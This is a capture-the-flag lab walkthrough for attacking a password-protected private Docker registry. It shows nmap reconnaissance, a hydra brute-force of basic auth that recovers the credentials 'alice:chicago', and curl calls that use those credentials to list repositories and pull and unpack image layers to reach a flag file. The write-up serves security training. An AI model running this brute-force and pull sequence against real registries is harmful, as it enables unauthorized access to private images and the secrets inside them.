#### 3. Protected Docker Registry I

----

- A protected (native auth) private Docker registry is on the same network as your Kali machine. There are some docker images present in the registry, one of which contains the flag.
- Objective: Interact with the private Docker registry, analyze the images and retrieve the flag! 

----

```sh
root@attackdefense:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2409: eth0@if2410: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:0a:01:01:05 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.1.5/24 brd 10.1.1.255 scope global eth0
       valid_lft forever preferred_lft forever
2412: eth1@if2413: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:1a:9b:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.26.155.2/24 brd 192.26.155.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~#
```

```sh
root@attackdefense:~# nmap -sV -sC 192.26.155.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-24 06:02 UTC
Nmap scan report for r2oqoy65buvs6zhfxubbr58fh.temp-network_a-26-155 (192.26.155.3)
Host is up (0.000015s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE  VERSION
5000/tcp open  ssl/http Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2019-05-13T14:57:01
|_Not valid after:  2020-05-12T14:57:01
MAC Address: 02:42:C0:1A:9B:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.56 seconds
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl -k https://192.26.155.3:5000
```

```sh
root@attackdefense:~# curl -k https://192.26.155.3:5000/v2/_catalog
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":[{"Type":"registry","Class":"","Name":"catalog","Action":"*"}]}]}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl -I -k https://192.26.155.3:5000/v2/_catalog
HTTP/2 401
content-type: application/json; charset=utf-8
docker-distribution-api-version: registry/2.0
www-authenticate: Basic realm="Registry Realm"
x-content-type-options: nosniff
content-length: 145
date: Wed, 24 Jul 2019 06:10:08 GMT

root@attackdefense:~#
```

```
root@attackdefense:~# hydra -l alice -P wordlists/100-common-passwords.txt 192.26.155.3 -s 5000 https-get /v2/
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2019-07-24 06:17:55
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~7 tries per task
[DATA] attacking http-gets://192.26.155.3:5000//v2/
[5000][http-get] host: 192.26.155.3   login: alice   password: chicago
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2019-07-24 06:17:57
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl -k -u alice:chicago https://192.26.155.3:5000/v2/_catalog
{"repositories":["treasure-hunt"]}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl -k -u alice:chicago https://192.26.155.3:5000/v2/treasure-hunt/tags/list
{"name":"treasure-hunt","tags":["latest"]}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl -k -u alice:chicago https://192.26.155.3:5000/v2/treasure-hunt/manifests/latest
{
   "schemaVersion": 1,
   "name": "treasure-hunt",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:f287fcae3f508f07ad566d43be1a5715b9308bfd4a2b034104ab039d367521cf"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"ArgsEscaped\":true,\"Image\":\"sha256:055936d3920576da37aa9bc460d70c5f212028bda1c08c0879aedf03d7a66ea1\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"container_config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) COPY file:00a109ce35d6dec5ee56fcd587b5f0c79eda7c13b9370ee2db9dd94b5885099a in /var/log/ \"],\"ArgsEscaped\":true,\"Image\":\"sha256:055936d3920576da37aa9bc460d70c5f212028bda1c08c0879aedf03d7a66ea1\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"created\":\"2019-05-13T15:19:34.667803396Z\",\"docker_version\":\"18.09.4\",\"id\":\"24e0b14f41f1cf2e42a0cfbee62d42b301d847b3af26b20a751887d1b8473fc0\",\"os\":\"linux\",\"parent\":\"ebc21e1720595259c8ce23ec8af55eddd867a57aa732846c249ca59402072d7a\"}"
      },
      {
         "v1Compatibility": "{\"id\":\"ebc21e1720595259c8ce23ec8af55eddd867a57aa732846c249ca59402072d7a\",\"parent\":\"7869895562ab7b1da94e0293c72d05b096f402beb83c4b15b8887d71d00edb87\",\"created\":\"2019-05-11T00:07:03.510395965Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"7869895562ab7b1da94e0293c72d05b096f402beb83c4b15b8887d71d00edb87\",\"created\":\"2019-05-11T00:07:03.358250803Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:a86aea1f3a7d68f6ae03397b99ea77f2e9ee901c5c59e59f76f93adbb4035913 in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "IXPP:FRRW:IN2W:J3G5:WJF5:Z67S:2FCK:2PW3:EKSJ:PRUY:QESF:DFLH",
               "kty": "EC",
               "x": "DJ3cLW48SpOPo1cf-B_GNRaQ1RvMyh_n5H6PY5_aWRk",
               "y": "dJs-o40RACWnKJS-2XhNPI9vHA7NmgCl19MvTG4r7f0"
            },
            "alg": "ES256"
         },
         "signature": "Qa4PjgH1ISaDBdlWnZ_s_6j_XjHKxj2AbndvtlEuWep6T2mtsJ4xxW9UTCamLtDzu1U5As7oDNIWYVywI_FE6w",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjI1NDcsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAxOS0wNy0yNFQwNjoyMDoyMFoifQ"
      }
   ]
}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl -s -k -u alice:chicago https://192.26.155.3:5000/v2/treasure-hunt/blobs/sha256:f287fcae3f508f07ad566d43be1a5715b9308bfd4a2b034104ab039d367521cf --output 1.tar
root@attackdefense:~# curl -s -k -u alice:chicago https://192.26.155.3:5000/v2/treasure-hunt/blobs/sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 --output 2.tar
root@attackdefense:~# curl -s -k -u alice:chicago https://192.26.155.3:5000/v2/treasure-hunt/blobs/sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10 --output 3.tar
```

```sh
root@attackdefense:~# mkdir compress
root@attackdefense:~# mv *.tar compress/
root@attackdefense:~# cd compress/
root@attackdefense:~/compress# tar -xf 1.tar
root@attackdefense:~/compress# tar -xf 2.tar
root@attackdefense:~/compress# tar -xf 3.tar
root@attackdefense:~/compress#
root@attackdefense:~/compress# ls -l
total 2772
-rw-r--r--  1 root root     186 Jul 24 06:23 1.tar
-rw-r--r--  1 root root      32 Jul 24 06:23 2.tar
-rw-r--r--  1 root root 2757034 Jul 24 06:23 3.tar
drwxr-xr-x  2 root root    4096 May  9 20:49 bin
drwxr-xr-x  2 root root    4096 May  9 20:49 dev
drwxr-xr-x 15 root root    4096 May  9 20:49 etc
drwxr-xr-x  2 root root    4096 May  9 20:49 home
drwxr-xr-x  5 root root    4096 May  9 20:49 lib
drwxr-xr-x  5 root root    4096 May  9 20:49 media
drwxr-xr-x  2 root root    4096 May  9 20:49 mnt
drwxr-xr-x  2 root root    4096 May  9 20:49 opt
dr-xr-xr-x  2 root root    4096 May  9 20:49 proc
drwx------  2 root root    4096 May  9 20:49 root
drwxr-xr-x  2 root root    4096 May  9 20:49 run
drwxr-xr-x  2 root root    4096 May  9 20:49 sbin
drwxr-xr-x  2 root root    4096 May  9 20:49 srv
drwxr-xr-x  2 root root    4096 May  9 20:49 sys
drwxrwxrwt  2 root root    4096 May  9 20:49 tmp
drwxr-xr-x  7 root root    4096 May  9 20:49 usr
drwxr-xr-x 11 root root    4096 May  9 20:49 var
root@attackdefense:~/compress#
```

```sh
root@attackdefense:~/compress# find . -name *flag* 2>/dev/null
./var/log/flag.txt
root@attackdefense:~/compress#
```

```sh
root@attackdefense:~/compress# cat ./var/log/flag.txt
50c02c6a4d355fec09f6e2ecff56dcae
root@attackdefense:~/compress#
```

----

###### Reference

- [Docker Registry HTTP API V2](https://docs.docker.com/registry/spec/api/)

----

EOF